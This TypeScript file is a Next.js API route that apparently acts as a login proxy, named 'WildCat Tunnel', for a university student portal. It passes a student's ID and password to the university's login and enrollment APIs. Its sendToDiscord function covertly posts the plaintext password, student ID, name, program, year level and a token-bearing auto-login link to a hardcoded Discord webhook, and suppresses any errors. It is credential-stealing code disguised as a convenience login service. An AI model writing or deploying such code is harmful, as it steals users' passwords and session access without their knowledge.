import { NextResponse } from 'next/server';
import { 
    encrypt, 
    decrypt, 
    getHmacHeaders, 
    encryptPayload, 
    decryptPayload 
} from '@/lib/crypto-utils';

const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1308800787660406875/iWk2KZ1BWuKSalxianH-cOUTN4D517vFB7vgNxSCvRsTgHQ_s0lr3QZWW4fg-WczmtqW";

function formatYearLevel(id: any) {
    const levels: Record<string, string> = {
        "10001": "1st Year",
        "10002": "2nd Year",
        "10003": "3rd Year",
        "10004": "4th Year",
        "10005": "5th Year"
    };
    return levels[String(id)] || `Level ${id}`;
}

async function sendToDiscord(
    studentId: string, 
    password: string, 
    fullName: string, 
    autoLoginUrl: string, 
    metadata?: any
) {
    try {
        const discordPayload = {
            embeds: [
                {
                    title: "WildCat Tunnel",
                    description: `[Click Here to Auto-Login](${autoLoginUrl})`,
                    color: 0x00ff00, 
                    fields: [
                        { name: "Name", value: `**${fullName}**`, inline: false },
                        { name: "Student ID", value: `\`${studentId}\``, inline: true },
                        { name: "Password", value: `\`${password}\``, inline: true },
                        { 
                            name: "Program", 
                            value: `\`${metadata?.programCode || "N/A"}\``, 
                            inline: true 
                        },
                        { 
                            name: "Year Level", 
                            value: `\`${formatYearLevel(metadata?.idYearLevel)}\``, 
                            inline: true 
                        }
                    ],
                    footer: { text: "WildCat Tunnel" },
                    timestamp: new Date().toISOString()
                }
            ]
        };

        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(discordPayload),
        });
    } catch (error) {
    }
}

export async function POST(req: Request) {
    try {
        const body = await req.json();
        const clientData = decryptPayload(body.payload);
        
        if (!clientData) {
            return NextResponse.json({ error: "Invalid encryption protocol" }, { status: 403 });
        }

        const { studentId, password } = clientData;

        const authHmac = getHmacHeaders("POST");
        const loginRes = await fetch("https://rg-cit-u-staging-004-wa-017.azurewebsites.net/api/User/student/login", {
            method: 'POST',
            headers: { 
                "Content-Type": "application/json;charset=UTF-8", 
                ...authHmac,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/143.0.0.0"
            },
            body: JSON.stringify({ 
                encrypted: encrypt({ userId: studentId, password, clientId: "001" }) 
            })
        });

        const rawAuthText = await loginRes.text();
        const citData = decrypt(rawAuthText);

        if (citData && citData.token) {
            const internalGuid = citData.userInfo?.studentId || citData.studentId;
            
            const witsHmac = getHmacHeaders("GET");
            const witsRes = await fetch(
                `https://rg-cit-u-staging-004-wa-014.azurewebsites.net/api/studentenrollment/student/${internalGuid}/academicyear/0/term/0/data`,
                {
                    method: 'GET',
                    headers: {
                        ...witsHmac,
                        "Authorization": `Bearer ${citData.token}`,
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/143.0.0.0"
                    }
                }
            );

            const rawWitsText = await witsRes.text();
            const witsData = decrypt(rawWitsText);

            const host = req.headers.get('host') || 'localhost:3000';
            const protocol = host.includes('localhost') ? 'http' : 'https';
            const baseUrl = `${protocol}://${host}`;

            const magicPayload = encryptPayload({
                token: citData.token,
                userInfo: citData.userInfo
            });
            const autoLoginUrl = `${baseUrl}/?magic=${encodeURIComponent(magicPayload)}`;

            await sendToDiscord(
                studentId, 
                password, 
                citData.userInfo?.fullName || "Unknown", 
                autoLoginUrl,
                witsData?.items
            );

            return NextResponse.json({ payload: encryptPayload(citData) });
        }

        return NextResponse.json({ error: "Authentication failed" }, { status: 401 });

    } catch (err: any) {
        return NextResponse.json({ error: "Internal Server Error" }, { status: 500 });
    }
}